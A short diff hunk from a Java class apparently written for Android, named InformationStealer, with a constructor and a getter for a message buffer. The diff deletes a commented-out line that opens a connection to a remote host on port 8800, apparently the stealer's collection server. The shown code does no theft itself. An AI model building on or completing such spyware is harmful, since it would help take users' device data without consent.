@@ -53,7 +53,6 @@ public class InformationStealer implements Runnable {
     public InformationStealer(Context context){
         this.context = context;
         messaggio = new StringBuilder();
-        //conn.openConnection("rblob.homepc.it", 8800);
     }
     public StringBuilder getMessaggio() {
         return messaggio;
